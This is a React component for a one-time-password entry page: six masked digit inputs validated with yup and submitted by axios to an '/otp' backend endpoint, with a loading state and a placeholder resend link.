import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css"; // Add your general styles here
import "../styles/pin.css"; // Specific styles for PIN input
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import BASE_URL from "../components/urls";
import phone from "../assets/phoneIcon.jpg";
// Validation schema
const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 5 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
        // Reset PIN input after successful submission
        setOtp(new Array(6).fill(""));
        setValue("otp", "");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="pin-container">
      <div className="pin-wrapper">
        <img src={phone} alt="" />
        <h1 className="pin-title">One-Time Password</h1>
        <p className="pin-subtitle">
          You will receive a One-Time-Password (OTP) on your registered mobile
          number / mobile App{" "}
        </p>

        <form className="pin-form" onSubmit={handleSubmit(submitForm)}>
          <div className="pin-input-wrapper">
            {otp.map((data, index) => (
              <input
                key={index}
                id={`otp-${index}`}
                type="password"
                maxLength="1"
                value={data}
                onChange={(e) => handleChange(e.target, index)}
                onFocus={(e) => e.target.select()}
                className="pin-input"
                inputMode="numeric"
              />
            ))}
          </div>

          {errors.otp && <div className="pin-error">{errors.otp.message}</div>}

          <p className="pin-resend">
            Did not receive code?{" "}
            <span className="pin-resend-link">Resend (in code)</span>
          </p>

          <button
            type="submit"
            className="pin-submit-button"
            disabled={loading}
          >
            {loading ? "Loading..." : "Verify"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Pin;
